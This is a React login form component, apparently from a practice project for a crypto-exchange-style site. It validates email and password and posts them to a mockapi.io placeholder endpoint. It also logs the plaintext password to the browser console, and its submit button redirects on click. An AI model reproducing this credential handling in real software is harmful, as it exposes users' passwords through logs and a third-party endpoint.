import React from 'react';
import Navv from './Navv';
import { Stack, Col, Container, Row, Image, Figure } from 'react-bootstrap';
import Apple from '../assets/apple-logo.png';
import Google from '../assets/google.png';
import Telegram from '../assets/telegram.png';
import Wallet from '../assets/wallet.png';
import BlackCol from './BlackCol';
import axios from 'axios';
import { Formik, Form, Field, ErrorMessage } from 'formik';
import * as Yup from 'yup';

export default function Login() {
  const postValue = (values) => {
    axios.post('https://666fc1d20900b5f87248205c.mockapi.io/Login', {
      email: values.email,
      password: values.password,
    });
    console.log(values.email);
    console.log(values.password);
  };

  const LoginSchema = Yup.object().shape({
    email: Yup.string().email('Invalid email').required('Required'),
    password: Yup.string()
      .min(8, 'Password is too short - should be 8 chars minimum.')
      .matches(/[a-zA-Z]/, 'Password must contain at least one letter.')
      .matches(/\d/, 'Password must contain at least one number.')
      .matches(/[!@#$%^&*(),.?":{}|<>]/, 'Password must contain at least one special character.')
      .required('Required'),
  });

  return (
    <div className='login-bdy'>
      <Navv />
      <Container>
        <Row className='d-flex flex-wrap'>
          <Col xs={12} md={6} className='blk-col'>
            <BlackCol />
          </Col>
          <Col xs={12} md={6} className='white-col'>
            <div className='login-container'>
              <h2>Log In</h2>
              <Formik
                initialValues={{ email: '', password: '' }}
                validationSchema={LoginSchema}
                onSubmit={(values, { setSubmitting }) => {
                  postValue(values);
                  setSubmitting(false);
                }}
              >
                {({ isSubmitting }) => (
                  <Form>
                    <Stack direction='horizontal' gap={3} className='mb-3'>
                      <p className="p-2">Email/Sub-account</p>
                    </Stack>
                    <div className='mb-3'>
                      <Field
                        className='form-control'
                        type="text"
                        name="email"
                        placeholder="Enter email"
                      />
                      <ErrorMessage name="email" component="div" className="error-message" />
                    </div>
                    <div className='mb-3'>
                      <Field
                        className='form-control'
                        type="password"
                        name="password"
                        placeholder="Password"
                      />
                      <ErrorMessage name="password" component="div" className="error-message" />
                    </div>
                    <button
                      className='btn btn-primary w-100 mb-3 nxt-btn'
                      type="submit"
                      disabled={isSubmitting}
                      onClick={()=>window.location.href='/Toggle'}
                    >
                      Log In
                    </button>
                  </Form>
                )}
              </Formik>
              <p className='text-center dont-have-account'>
                Don't have an account? <span className='signup-link' onClick={() => window.location.href = '/signup'}>Sign Up</span>
              </p>
              <br />
              <p className='text-center or-continue-with'>
                <span className='line'></span> or continue with <span className='line'></span>
              </p>
              <Stack direction='horizontal' gap={2} className='justify-content-center'>
                <button className='btn round-btn'>
                  <Image src={Google} alt='Google' roundedCircle width={20} height={20} />
                  <Figure.Caption>Google</Figure.Caption>
                </button>
                <button className='btn round-btn'>
                  <Image src={Apple} alt='Apple' roundedCircle width={20} height={20} />
                  <Figure.Caption>Apple</Figure.Caption>
                </button>
                <button className='btn round-btn'>
                  <Image src={Telegram} alt='Telegram' roundedCircle width={20} height={20} />
                  <Figure.Caption>Telegram</Figure.Caption>
                </button>
                <button className='btn round-btn'>
                  <Image src={Wallet} alt='Wallet' roundedCircle width={20} height={20} />
                  <Figure.Caption>Wallet</Figure.Caption>
                </button>
              </Stack>
            </div>
            <center>
              <p className='recap'>This site is protected by Google reCAPTCHA to ensure you're not a bot <span><b>Learn More</b></span></p>
            </center>
          </Col>
        </Row>
      </Container>
    </div>
  );
}
